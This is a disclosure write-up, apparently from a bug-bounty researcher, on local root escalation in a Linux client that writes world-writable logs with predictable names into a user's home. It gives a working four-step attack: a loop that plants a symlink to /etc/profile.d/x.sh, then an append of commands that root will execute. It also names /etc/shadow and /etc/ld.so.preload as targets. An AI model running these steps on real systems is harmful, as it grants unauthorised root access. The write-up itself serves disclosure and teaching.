---
title:       "Local root escalation via symlink: the log a privileged process leaves in your folder"
summary:     "A service running as root wrote its log into the directory of the user who launched it, with a predictable name, and gave it write permissions for everyone. That is all it takes to create any system file and have root execute it."
date:        2026-11-05 16:45:00 +0100
lang:        en
ref:         escalada-symlink-log-root
image:       /assets/img/og/escalada-symlink-log-root-en.png
permalink:   /en/writeups/symlink-root-log-privilege-escalation/

severity:    high
cvss:        "7.8"
cvss_vector: "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
cwe:         "CWE-59 · CWE-732"
vuln_class:  "Access control"
target_type: "Desktop client (Linux)"
platform:    "YesWeHack"
status:      "Reported"
tags:        [privilege-escalation, linux, symlink, toctou, root, permissions]

takeaways:
  - "If a root process writes inside a folder an ordinary user controls, that user decides which file gets written."
  - "`touch` and `chmod` **follow** symlinks. The kernel protection only covers `/tmp`-style directories, not your home."
  - "\"I can run one specific command as root\" and \"I am root\" are different things. Turning the first into the second is privilege escalation."
  - "You do not need to win a race if the filename is predictable: you plant the link and wait."
---

Of all the bugs I have published, this is the simplest to understand and the one that made
me think the most. No injection, no network, no cryptography. Just **a program writing a
log file in the wrong place**.

<div class="warn" markdown="1">
**Everything is anonymised.** Published with the program's permission and without
identifying the product: vendor, file names, paths and versions have been changed. The
mechanism and the code are exact.
</div>

## The starting point: a very sensible `sudo` rule

On a shared Linux machine — a work server, a lab box, a company workstation — the
administrator wants an ordinary user to be able to start a certain application, which needs
root privileges to touch the network. So they add a rule:

```
user ALL=(root) NOPASSWD: /usr/bin/client
```

That line says *"this user may run **this one program** as
administrator, without being asked for a password"*. It is a **correct** and recommended
practice: instead of granting full admin rights, you grant permission for one specific
thing.

The boundary the administrator is drawing is crystal clear: *you may run that program as
root*, not *you are root*. This entire bug is about erasing that boundary.

And it is worth insisting, because it is the objection I expected from triage: *"but they
could already run something as root"*. No. They could run **one** program. Now they can run
**any**, including reading `/etc/shadow` and installing persistence.

## The three lines of the bug

Inside the client, this:

```python
# configuration
LOGS_DIR = '/home/' + (os.getenv('SUDO_USER') or os.getenv('USER')) + '/.client/logs'

# on connect
log_file = LOGS_DIR + '/log-' + str(int(time.time())) + '.log'
run('touch ' + log_file + '; chmod 666 ' + log_file)

# and the runner
def run(command):
    subprocess.Popen(command, shell=True)
```

Read it slowly, because the three things that break it are right there:

**1. The process is root, but it writes into a user's folder.**

```python
os.getenv('SUDO_USER')
```

When you run something with `sudo`, the system leaves a trace of who
you were: the `SUDO_USER` variable. The program uses it **on purpose** so the logs land in
the user's folder instead of root's. The intention is good — so you can read your own logs
— but the effect is that **an all-powerful process is writing inside territory you fully
control**.

**2. The filename is predictable.** It is the time, in seconds. Nothing random about it.

**3. It makes it world-writable**, with `chmod 666`.

## What a symlink is and why this breaks everything

A symbolic link is a file that contains no data: it contains **an address**. It is a sign
saying "what you are looking for is over there".

```bash
ln -s /etc/passwd  my-shortcut
cat my-shortcut          # shows /etc/passwd
```

What matters here is not what a link is, but **who follows it**: when writing to a link, most tools write to the target. If I put one where you are about to write, and you are root, you write wherever I tell you to.

<figure>
  <img src="{{ '/assets/img/writeups/escalada-symlink/01-enlace-simbolico-en.svg' | relative_url }}"
       alt="Diagram: the user plants a symlink at the predictable log path and the root process, writing there, ends up creating a system file writable by everyone">
  <figcaption>The root process writes to a path you control. You decide where it points.</figcaption>
</figure>

And yes: `touch` and `chmod` follow links.

<div class="note" markdown="1">
**"But doesn't the kernel protect against this?"** Partly, through a protection called
`protected_symlinks`. Which is why reading it carefully matters: it only acts on **shared,
sticky-bit** directories, the `/tmp` kind, where every user writes.

A user's home folder **is not one of those**. It is theirs, plain and ordinary. The
protection does not apply. I checked this with both kernel options enabled, which is the
default on a modern distribution.
</div>

## The attack, in four steps

The attacker is a local account with **no privileges**: no special groups, no valid
password, with only the `sudo` rule above.

```bash
# 1 · plant one symlink per second at the predictable log path, pointing at the target
while true; do
    ln -sf /etc/profile.d/x.sh "$HOME/.client/logs/log-$(date +%s).log"
    sleep 1
done
```

```bash
# 2 · wait. This is not a race: the window is minutes wide.
```

```
# 3 · the legitimate user connects. Root runs:
#     touch <path>; chmod 666 <path>
#     ...follows the link and creates /etc/profile.d/x.sh owned by root, mode 666
```

```bash
# 4 · write into that file, now root-owned but writable by anyone
echo 'id > /tmp/CANARY' >> /etc/profile.d/x.sh
```

`/etc/profile.d/` is a folder whose scripts run **every time anyone
opens a login shell**, root included. So I have made root create a file that I can write
to, inside a folder whose contents root executes. Whatever I write there runs with root's
privileges.

And look at step 2: **there is no race to win**. Since the name depends only on the time in
seconds, I plant one link per second and wait calmly. That is the difference between a
"theoretically exploitable" bug and one that works every time.

Aside: even with no attacker at all, **every log that program writes is left readable and
writable by every user on the machine**. That alone is a problem on any shared box.

## Where I stopped, and why I am saying so

This went in the report and I consider it as important as the bug:

- I did **not** point the link at `/etc/shadow`, `/etc/sudoers.d/`, `/etc/ld.so.preload` or
  any real system file.
- The link pointed at a canary file **carrying my own handle**, which I deleted as soon as
  the point was made.
- I ran nothing as root beyond writing the canary comment.
- I touched nobody's data: the machine was my own VM, with my own accounts.
- I stopped **the moment the primitive was confirmed**, uninstalled the client and removed
  everything.

To prove I can create any file as root, **creating a harmless one is
enough**. Pointing at `/etc/shadow` proves nothing extra and turns your report into an
incident. The difference between a researcher and a problem is exactly where you decide to
stop.

## Impact

<div class="impact" markdown="1">
**Impact.** Any unprivileged local user, on a machine where that `sudo` rule exists, gets
**root execution**: reading `/etc/shadow`, persistence, modifying system binaries and
access to every other user's files. The natural setting for this client is shared machines
— workstations, jump hosts, lab boxes — which is exactly where granting a narrow permission
instead of full root is the **correct** practice. The bug punishes precisely the people who
did their job properly.
</div>
